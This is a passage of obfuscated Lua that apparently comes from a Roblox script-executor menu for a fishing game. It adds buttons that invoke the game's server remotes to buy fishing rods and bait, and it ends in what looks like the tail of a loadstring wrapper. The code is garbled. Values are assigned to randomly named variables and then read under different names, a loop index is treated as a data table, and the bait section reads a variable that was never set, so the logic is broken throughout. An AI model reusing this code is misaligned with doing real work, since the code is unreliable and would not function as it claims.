    elseif AldyToiQ >= 1000 then
        return string.format("%.2fK", AldyToiQ / 1000)
    else
        return tostring(AldyToiQ) .. " Coins"
    end
end

local var_vgutmx = {}
for AldyToiQ, AldyToiT in ipairs(AldyToin:GetChildren()) do
    if AldyToiT:IsA("ModuleScript") then
        local var_mbdfdk, AldyToic = pcall(require, AldyToiT)
        if AldyToiQ and typeof(AldyToic) == "table" then
            local var_ywtcuc = AldyToic.Data
            if AldyToiQ and AldyToiQ.Type == "fishing Rods" then
                local var_o6jmvl = AldyToiQ.Id or "?"
                local var_1yiz6e = AldyToiQ.Name or AldyToiT.Name
                local var_bi0xho = AldyToiQ.Description or "No description."
                local var_lwnaiw = "no price"
                if AldyToic.Price then
                    AldyTois = AldyToimG(AldyToic.Price)
                    table.insert(AldyToiCG, {
                        ID = AldyToiY,
                        Name = AldyToiG,
                        Desc = AldyToiO,
                        Harga = AldyTois
                    })
                end
            end
        end
    end
end

do
    AldyToiQU:Paragraph({
        Title = "Buy Fishing Rods",
        Desc = "Some rods can't be purchased because they are VIP only or don't have a price map.",
        Color = "Yellow"
    })
    for AldyToiT, AldyToic in ipairs(AldyToiCG) do
        AldyToiQU:Button({
            Title = string.format("%s (%s)", AldyToic.Name, AldyToic.Harga),
            Callback = function()
                local var_jwnsns, AldyToiY = pcall(function()
                    return AldyToiH.Packages._Index.net.RF_PurchaseFishingRod:InvokeServer(AldyToic.ID)
                end)
                AldyToiQ:Notify({
                    Title = "Purchase Rod",
                    Description = AldyToiT and "Successfully purchased " .. AldyToic.Name or "Failed to buy " .. AldyToic.Name,
                    Duration = 2
                })
                if not AldyToiT then warn("Failed to purchase fishing rod", AldyToiY) end
            end
        })
    end

    local var_i0vvnt = AldyToiH:FindFirstChild("Baits")
    if not AldyToiT then
        warn("Bait folder not found.")
        return
    end
    AldyToiQU:Paragraph({
        Title = "Buy Bait",
        Desc = "Purchase bait from the list below.",
        Color = "Yellow"
    })
    for AldyToiQ, AldyToiT in ipairs(AldyToiT:GetChildren()) do
        if AldyToiT:IsA("ModuleScript") then
            local var_o87hxp, AldyToic = pcall(require, AldyToiT)
            if AldyToiQ and (AldyToic and AldyToic.Data) then
                local var_aft8qp = AldyToic.Data.Id or 0
                local var_j5wopr = AldyToic.Data.Name or "Unknown"
                local var_v985xb = AldyToic.Data.Description or "-"
                local var_wb78sq = AldyToic.Price and AldyToic.Price .. " Coins" or "No price."
                AldyToiQU:Button({
                    Title = AldyToiT .. (" (" .. (AldyToiG .. ")")),
                    Callback = function()
                        pcall(function()
                            AldyToiH.Replion._Index.net.RE_PurchaseBait:InvokeServer(AldyToiQ)
                        end)
                    end
                })
            end
        end
    end
end'))()